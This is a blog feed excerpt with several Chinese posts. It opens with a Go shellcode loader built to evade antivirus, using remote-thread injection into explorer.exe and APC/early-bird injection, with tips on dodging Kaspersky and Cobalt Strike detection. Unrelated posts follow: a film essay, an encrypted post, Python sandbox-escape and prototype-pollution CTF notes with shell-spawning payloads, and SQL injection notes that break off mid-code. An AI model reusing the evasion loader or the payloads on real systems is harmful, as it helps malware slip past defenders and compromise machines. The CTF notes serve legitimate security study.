Decode(encodeDataByte)<br><span class="hljs-comment">// 获取notepad.exe进程句柄</span><br>hProcess, err := getProcessHandleByName(<span class="hljs-string">&quot;explorer.exe&quot;</span>)<br><span class="hljs-keyword">defer</span> windows.CloseHandle(hProcess)<br><span class="hljs-comment">// 在目标进程中分配内存</span><br>lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)<br>    <span class="hljs-comment">// 向目标进程内存写入shellcode</span><br>    err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)<br>    <span class="hljs-comment">// 创建远程线程来执行注入的代码</span><br>    err = createRemoteThreadToExecute(hProcess, lpBaseAddress)<br><br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="APC"><a href="#APC" class="headerlink" title="APC"></a>APC</h3><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113112901273.png" class="" title="image-20250113112901273"><p>后面代码中的earybirl注入和apc注入都是利用了APC机制</p><p>apc注入的前面和线程注入是相同的，只是后面不是新建线程而是<strong>通过apc来执行shellcode</strong></p><p>earybirl注入:创建一个rw内存空间，写入shellcode后换成rx，通过apc执行shellcode</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">EarlybirlInject</span><span class="hljs-params">(shellcode []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>addr, _ := allocateAndProtectMemory(shellcode)<br>setupAPC(addr)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">allocateAndProtectMemory</span><span class="hljs-params">(shellcode []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">uintptr</span>, <span class="hljs-type">error</span>) &#123;<br>kernel32 := windows.NewLazySystemDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)<br>ntdll := windows.NewLazySystemDLL(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)<br><br>VirtualAlloc := kernel32.NewProc(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>)<br>VirtualProtect := kernel32.NewProc(<span class="hljs-string">&quot;VirtualProtect&quot;</span>)<br>RtlCopyMemory := ntdll.NewProc(<span class="hljs-string">&quot;RtlCopyMemory&quot;</span>)<br><br>addr, _, _ := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)<br><br>_, _, _ = RtlCopyMemory.Call(addr, (<span class="hljs-type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])), <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)))<br><br>oldProtect := PAGE_READWRITE<br>_, _, _ = VirtualProtect.Call(addr, <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), PAGE_EXECUTE_READ, <span class="hljs-type">uintptr</span>(unsafe.Pointer(&amp;oldProtect)))<br><br><span class="hljs-keyword">return</span> addr, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setupAPC</span><span class="hljs-params">(addr <span class="hljs-type">uintptr</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">const</span> (<br>QUEUE_USER_APC_FLAGS_NONE = <span class="hljs-literal">iota</span><br>QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC<br>QUEUE_USER_APC_FLGAS_MAX_VALUE<br>)<br><br>ntdll := windows.NewLazySystemDLL(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)<br>kernel32 := windows.NewLazySystemDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)<br>GetCurrentThread := kernel32.NewProc(<span class="hljs-string">&quot;GetCurrentThread&quot;</span>)<br>NtQueueApcThreadEx := ntdll.NewProc(<span class="hljs-string">&quot;NtQueueApcThreadEx&quot;</span>)<br><br>thread, _, err := GetCurrentThread.Call()<br><br>_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, <span class="hljs-type">uintptr</span>(addr), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于加载方式，还可以通过调用无意义的windows api来做混淆，以及寻找更罕见的api去执行命令等方式做免杀</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250117105324151.png" class="" title="image-20250117105324151"><p>​对卡巴内存扫描（ekko等技术）做了尝试，最后可能还是需要通过二开c2等方式绕过，常规的免杀方法基本只能上线一段时间了，cs的stageless免杀效果更好，</p><p>​流量上需要可以通过改cs profile也能一定程度规避杀软，还能用云函数，域前置这些技术</p><p>demo源码</p><p><a href="https://github.com/z2zQAQ/go-z2zloader">https://github.com/z2zQAQ/go-z2zloader</a></p><p>学习文章</p><p><a href="https://cloud.tencent.com/developer/article/2361596">攻防实战|钓鱼手法及木马免杀技巧-腾讯云开发者社区-腾讯云</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18362694">免杀基础学习记录 - F12~ - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超脱</title>
    <link href="/2024/06/27/%E8%B6%85%E8%84%B1/"/>
    <url>/2024/06/27/%E8%B6%85%E8%84%B1/</url>
    
    <content type="html"><![CDATA[<p>​上年年底看完了《超脱》，影片的叙事手法很有趣，穿插着各种主人公的独白，基调沉重，充斥着存在主义色彩，围绕教育，校园，父母，存在进行讨论。可以说是这几年看到最喜欢的电影了，今天没事正好写一下看完这部作品的感受</p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240629235228837.png" alt="image-20240629235228837"><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240629235253104.png" alt="image-20240629235253104"></p><h1 id="血脉相连的家人或是侵犯者？"><a href="#血脉相连的家人或是侵犯者？" class="headerlink" title="血脉相连的家人或是侵犯者？"></a>血脉相连的家人或是侵犯者？</h1><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240627235316266.png" alt="image-20240627235316266"></p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240627235325179.png" alt="image-20240627235325179"></p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240627235332602.png" alt="image-20240627235332602"></p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240627235336475.png" alt="image-20240627235336475"></p><p>​近几年，原生家庭这个词语先从出现在人们面前，因带有心理学上决定论的色彩顺利地解释了大量当代人的心理疾病而大火到最近人们对这个词语开始感觉到一定厌烦，这个主题显然值得讨论</p><p>​抛却掉对于主人公henry是否是家庭中毁三观的性侵的产物的讨论，从影片中可以确定的情节出发，henry的爷爷失去自理能力，<strong>对于henry存在莫名的亏欠感，弥留之际向他不断诉说着歉意，而henry将他照顾的无微不至，用尽心思，身后表现出深深的无奈与冷漠</strong></p><p>​他的反差来自于他对于社会责任的担负，即对于生养自己的人的负责，同时对于这位侵害者，我很难言说他表现出来的到底是何情感</p><p>​令我印象较为深刻的有两处，一处是面对没有好好照顾爷爷的护士henry情绪爆发，一处是爷爷去世之时对其表达歉意，甚至把他错认为被自己性侵了而选择自杀的女儿，他却紧握着他的双手，对他诉说着“没事的”，希望能降低他死时的痛苦与歉意。</p><p>​对于这个课题，个人而言，家庭作为无法选择的课题，若是过于糟糕那在未来选择只尽养育之责也无可厚非。而<strong>当亲情一词成为某种程度的道德绑架那显得毫无意义，子女回报理应基于祖辈的爱意与关怀而非表面功夫以及单纯的渴望回报的情绪</strong></p><blockquote><p>现代人类不该是他者性欲的副产物，作为一个理性的行动者在能承担起责任前请勿随意</p></blockquote><h1 id="值得沉醉的事物"><a href="#值得沉醉的事物" class="headerlink" title="值得沉醉的事物"></a>值得沉醉的事物</h1><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240628001554227.png" alt="image-20240628001554227"></p><blockquote><p>我所知道的人都是一样的，有人靠酒，有人靠女人，也有人靠神。家人，国王，梦想，大家都要沉醉于某种东西，不然就过不下去啊，大家……都是某种东西的奴隶。 </p><p>—— <a href="https://www.juzikong.com/authors/f07b3e9c-a51e-4e99-a765-0dd6b1c9943f"><strong>肯尼·阿卡曼</strong></a> [<strong>《进击的巨人》</strong>]</p></blockquote><p>一段让我想到巨人里面的肯尼的台词…实际上这部作品并非太讨论此问题</p><p>​只不过看见这段内容也可以顺着之前的一些想法写下去，这些所谓某种沉醉的东西作为我们的“热爱”，“偏执”，“怪癖”存在着，当代人的精神力量无法再次来自于教派，<strong>理性代替了神权，带来了无比崇高的选择自由，同时也带来了迷茫</strong>。</p><p>​思考一个问题，爱好分三六九等吗？梦想分高低吗？对于肯尼台词中的“奴隶”一词我并不大认同，如前面所言理性为我们带来了选择上的自由，我们有权利去选择追逐的东西（当然会存在大量阶段性的迷茫），我所认为的<strong>奴隶</strong>类似于某种<strong>造神</strong>的行为，放弃自我的权利而神化某个客体。</p><h1 id="超脱于人群，还是受困于自我"><a href="#超脱于人群，还是受困于自我" class="headerlink" title="超脱于人群，还是受困于自我"></a>超脱于人群，还是受困于自我</h1><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240628003316533.png" alt="image-20240628003316533"></p><p>​henry在剧中被塑造为一个神性的角色（类似infj？），他的神性来自于他面对外界的平静，沉稳，情感深厚如泉却从不外露。但于个人视角，henry这个角色却带着不尽的悲凉气息，他的超脱并非是来自于以上种种。</p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240629235035519.png" alt="image-20240629235035519"></p><p>​面对雏妓艾瑞卡，他伸出援手，让艾瑞卡体验到无条件的帮助，也让她认为这是爱，显然这个过程中henry是抽离的，他不断提醒艾瑞卡的帮助只是片刻的，后来将艾瑞卡送走了。因外貌与不被理解的爱好的女学生梅里迪斯受其鼓励而振作生活，可是当女教师看见梅里迪斯向henry索取拥抱而产生误解，henry这个角色的平静彻底被打破，影片中闪回着henry童年时期的记忆，随之而来的是他彻底的崩溃。</p><p>​面对这两个角色，henry同样是以给予者的身份出现，他<strong>无私的施以援手，直到对方向他表达出需要，他超脱于受他帮助者的身旁，当发现他者渴望建立更深的联系的那一刻选择离开</strong>，或许是梅里迪斯的自杀刺激了他，<strong>脱身于受助者是神圣的脱离还是受困于过去？</strong>在与艾瑞卡重新见面那一刻，我才体会到剧名超脱的味道</p><p><img src="/2024/06/27/%E8%B6%85%E8%84%B1/image-20240629235525821.png" alt="image-20240629235525821"></p><hr><p>“超脱”，是自我抽离，审视自身存在的灵魂，再重新回到存在本身</p>]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鼠疫</title>
    <link href="/2024/06/27/%E9%BC%A0%E7%96%AB/"/>
    <url>/2024/06/27/%E9%BC%A0%E7%96%AB/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fe458588d460b36920834ef411d7774cd775e726a1e0285deb6c1cb60a7c4040">d7bee52400958b566309f151f53f4d87cf450013cb9b7818b47f036b1bacc2830b46fd78a735f3b13d4d9140b5fe054211bec724f9ee5138e930105444e22e0c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码才可以访问噢</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python安全</title>
    <link href="/2024/06/27/python%E5%AE%89%E5%85%A8/"/>
    <url>/2024/06/27/python%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><blockquote><p>python 函数和类方法(对于类未重写的内置方法数据类型为装饰器 wrapper_descriptor，重写后为 function)都有一个__globals__属性可以将函数或者类方法申明的变量空间中的全局变量以字典的方式返回</p></blockquote><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/JMYUbN0Muo6bmJxJgCwcaAvsnwd.png" alt="截图"></p><p>如上定义了全局变量和 a 类中的内置变量，如何通过一个 b 的实例来修改他们？</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/G5h3bn52zoDQfrxaELvc0YHfnWd.png" alt="截图"></p><p>获取了 b 的__init__方法后调用__globals__属性修改了全局变量以及未继承的类属性</p><h3 id="继承链"><a href="#继承链" class="headerlink" title="继承链"></a>继承链</h3><p><strong>mro</strong>[-1]:获取类的继承关系，最后一个是 class 类，也可以直接用__base__（需要保证直接继承 class）</p><p><strong>init</strong>.<strong>globals</strong>:获取方法后调用 globals 获取全局变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;__str__&quot;</span> : <span class="hljs-string">&quot;Polluted ~&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>获取实例的类之后获取它的基类，修改基类的__str__属性（也可以指向其他属性），但是无法直接修改 object 类，且需要有继承关系</p><h3 id="sys-模块"><a href="#sys-模块" class="headerlink" title="sys 模块"></a>sys 模块</h3><p>在此基础上可以修改其他模块的属性，但是当代码复杂的时候需要利用 sys 模块</p><blockquote><p><code>sys</code> 模块的 <code>modules</code> 属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p></blockquote><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/ApwDbuepgoKiWIx4Kq4cBFMUnvd.png" alt="截图"></p><p>sys 字典存放了所有加载的模组（python 中存在默认加载的模组，但是其并不一定可用），如果被 ban 掉了 os 模块，可以将其删除后重新导入</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/V3YCbEVRnoZavrxacLXc47e0nwc.png" alt="截图"></p><h3 id="loader-加载器"><a href="#loader-加载器" class="headerlink" title="loader 加载器"></a>loader 加载器</h3><blockquote><p>loader 是为实现模块加载而设计的类，其在 <code>importlib</code> 这一内置模块中有具体实现。令人庆幸的是 <code>importlib</code> 模块下所有的 <code>py</code> 文件中均引入了 <code>sys</code> 模块</p></blockquote><p>因此只要获取一个 loader 就可以得到 sys 模块，其中__loader__属性会被默认赋值为当前模块的 loader(debug 模式为 None)</p><p>__spec__内置属性定义在 importlib 模块下，可以利用</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/Lc5Kbt0QSo3rsHx5lovcOmaDnsf.png" alt="截图"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/QihObZQH1owVLJxaD1PcyTzInNg.png" alt="截图"></p><h3 id="defaults-与-kwdefaults"><a href="#defaults-与-kwdefaults" class="headerlink" title="defaults 与 kwdefaults"></a>defaults 与 kwdefaults</h3><p>存放了函数默认值</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>___import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat ./flag.txt&#x27;</span>)_<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p>getattr 获取属性</p><p>chr（）</p><p>bytes.decode</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/S5TTbL3oWo5XIrxDmIMcAo7wnAL.png" alt="截图"></p><p>Tips:bytes 函数本身也可以寻找</p><p>Help：交互终端 rce</p><p>输入之后再输入模块名（os 获取__main__）</p><p>breakpoint（）:进入 Pdb 调试一句话 RCE</p><p>海象运算符:&#x3D;：一个 input 执行多行命令</p><p>dir 查看方法</p><p>lambda 绕过</p><p>__doc__文档表寻找可用字符</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/OI5xbuJxfoKFB4xhk4Jcx78RnJv.png" alt="截图"></p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>污染 flask secret_key（伪造秘钥）</p><p>和_got_first_request 和_static_url_path</p><p>exported_names</p><h5 id="os-path-pardir（影响了-render-template-的解析，默认为-，flask-通过它来限制目录穿越则可把他修改为其他无关的内容）"><a href="#os-path-pardir（影响了-render-template-的解析，默认为-，flask-通过它来限制目录穿越则可把他修改为其他无关的内容）" class="headerlink" title="os.path.pardir（影响了 render_template 的解析，默认为..，flask****通过它来限制目录穿越则可把他修改为其他无关的内容）"></a><strong>os.path.pardir<strong><strong>（影响了 render_template 的解析，默认为..，</strong></strong>flask****通过它来限制目录穿越则可把他修改为其他无关的内容）</strong></h5><p>jinjia_env(修改语法实现 ssti 绕过 waf)</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/KkQ6bravHoP8Uoxbo50c9g56n2f.png" alt="截图"></p><p>os.environ</p><h2 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick"></a>Trick</h2><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>for 循环</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/V4oobclegoLhIrxH64UcuslYnXc.png" alt="截图"></p><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>list 生成器和中括号</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/M1FLbpvjxo01PNxouikcmiiOnKc.png" alt="截图"></p><h2 id="eval-导致环境变量可修改"><a href="#eval-导致环境变量可修改" class="headerlink" title="eval 导致环境变量可修改"></a>eval 导致环境变量可修改</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p></blockquote><p>底层调用了 bash -c 指令</p><p>若环境变量可控则可以执行命令</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/WAkwbNqGZoXmCVxRcAgcPDuGnEE.png" alt="截图"></p><h2 id="unicode-字符"><a href="#unicode-字符" class="headerlink" title="unicode 字符"></a>unicode 字符</h2><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/H6H3b0C0RoAnAKx7KjmcMuTrnVg.png" alt="截图"></p><blockquote><p><a href="https://ctf.njupt.edu.cn/archives/805">https://ctf.njupt.edu.cn/archives/805</a></p></blockquote><blockquote><p><a href="https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/">https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/</a></p></blockquote><h1 id="PYjail"><a href="#PYjail" class="headerlink" title="PYjail"></a>PYjail</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610152619197.png" alt="image-20240610152619197"></p><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>空格，_<em>import</em>_, importlib.import_module exefile(也可以open之后exec，一般要事先确认一下(path)</p><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>str函数</p><p>chr函数</p><p>list+dict</p><p>_<em>doc</em>_</p><p>bytes函数</p><h2 id="字符串变化"><a href="#字符串变化" class="headerlink" title="字符串变化"></a>字符串变化</h2><p>[::-1]</p><p>字符串拼接（+）</p><p>eval&#x2F;exec</p><p>_<em>loader</em>_.load_module</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610152942891.png" alt="image-20240610152942891"></p><h2 id="恢复sys-module"><a href="#恢复sys-module" class="headerlink" title="恢复sys.module"></a>恢复sys.module</h2><p>一个存储加载过的模块信息，里面的模块不能直接使用，需要经过import</p><p>import一个模块的时候：检查是否存在sys.module中吗，没有则创建并加载，有则不加载</p><p>此外，存在modules中的库会优先import，如果在本地创建了同名文件，需要先del</p><p>python3之后的reload需要导入importlib模块</p><p>假如被禁用了：<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153312932.png" alt="image-20240610153312932"></p><h2 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h2><p>system不是字符串，不能编码绕过</p><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153437556.png" alt="image-20240610153437556"></h3><h3 id="getattr获取方法属性"><a href="#getattr获取方法属性" class="headerlink" title="getattr获取方法属性"></a>getattr获取方法属性</h3><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153513555.png" alt="image-20240610153513555"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153552642.png" alt="image-20240610153552642"></p><h2 id="内建模块"><a href="#内建模块" class="headerlink" title="内建模块"></a>内建模块</h2><p>关于dict：一个模块对象有一个由字典对象实现的命名空间，属性的引用会被转换为这个字典中的查找，例如，m.x 等同于 m.dict[“x”]。</p><p>那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153858787.png" alt="image-20240610153858787"></p><h2 id="继承关系逃逸"><a href="#继承关系逃逸" class="headerlink" title="继承关系逃逸"></a>继承关系逃逸</h2><p>直接继承与间接继承</p><p>site类直接引入了os</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154233610.png" alt="image-20240610154233610"></p><p>warnings类的子类linecache引入了os<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154308261.png" alt="image-20240610154308261"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154324692.png" alt="image-20240610154324692"></p><p>也就是先获取warnings再获取linecache再到os</p><h2 id="行数限制"><a href="#行数限制" class="headerlink" title="行数限制"></a>行数限制</h2><p>exec中\n换行</p><p>empile</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612121536686.png" alt="image-20240612121536686"></p><p>海象表达式</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612121545670.png" alt="image-20240612121545670"></p><h2 id="help"><a href="#help" class="headerlink" title="help()"></a>help()</h2><p>随便进一个模块 #！或者！sh  </p><p>server</p><p>locals</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612104521484.png" alt="image-20240612104521484"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>过滤. [截图] :_<em>getitem</em>_  pop()</p><p>python3.6:PEP498<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610155737068.png" alt="image-20240610155737068"></p><p>__globals__：func_globals</p><p>_<em>mro__： _<em>bases</em></em> _<em>base</em>_</p><p>引号：str</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612115730113.png" alt="image-20240612115730113"></p><p>数字：<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612120104791.png" alt="image-20240612120104791"></p><p>fromhex frombytes</p><p>_<em>doc</em>_:从帮助文档获取字符</p><p>dict(list())转换为字符串</p><p>内建函数</p><h2 id="特殊利用"><a href="#特殊利用" class="headerlink" title="特殊利用"></a>特殊利用</h2><p>byte函数：type(str(1).encode)</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612104158931.png" alt="image-20240612104158931"></p><p>抛出异常：raise OSError</p><p>unicode注入</p><p>eval(input)绕过输入长度限制</p><p>breakpoint提起时期</p><p><a href="https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkI5YW1fwfRmD#toc-9">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>pyhon</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>top10漏洞</title>
    <link href="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/27/top10%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="OWASP-10"><a href="#OWASP-10" class="headerlink" title="OWASP-10"></a>OWASP-10</h1><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/TXA5bTle4oxg5TxfrqHcq0Z9nne.jpg"></p><h1 id="Sql-注入"><a href="#Sql-注入" class="headerlink" title="Sql 注入"></a>Sql 注入</h1><p><a href="https://mp.weixin.qq.com/s/frwK49IatUqUoT-4DR08GQ">https://mp.weixin.qq.com/s/frwK49IatUqUoT-4DR08GQ</a></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/CSnebxG6woM5WCx1hk9cmtbCnkh.png"></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/EzmPbr01Oo7NAlxHNWVcRtW5nnd.png"></p><p>绕过方式</p><p>大小写 双写 空格 内敛注释 url 编码 十六进制 逗号 比较符 注释符 宽字节</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/OFxLbMlvaoD62vxKoyscZuoHnDf.png"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="Out-of-band-SQLi"><a href="#Out-of-band-SQLi" class="headerlink" title="Out-of-band SQLi"></a>Out-of-band SQLi</h3><p> 通过数据库服务器使⽤不同的通道 如HTTP请求或DNS查询 来传输数据</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span> 是mysql对xml文档数据进行查询和修改的xpath函数 <br><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span> 是mysql对xml文档数据进行查询的xpath函数 <br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span> mysql中用来取整的函数 <br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">()</span></span> 此函数返回<span class="hljs-built_in">e</span>(自然对数的底)指数X的幂值<br></code></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">benchmark</span><span 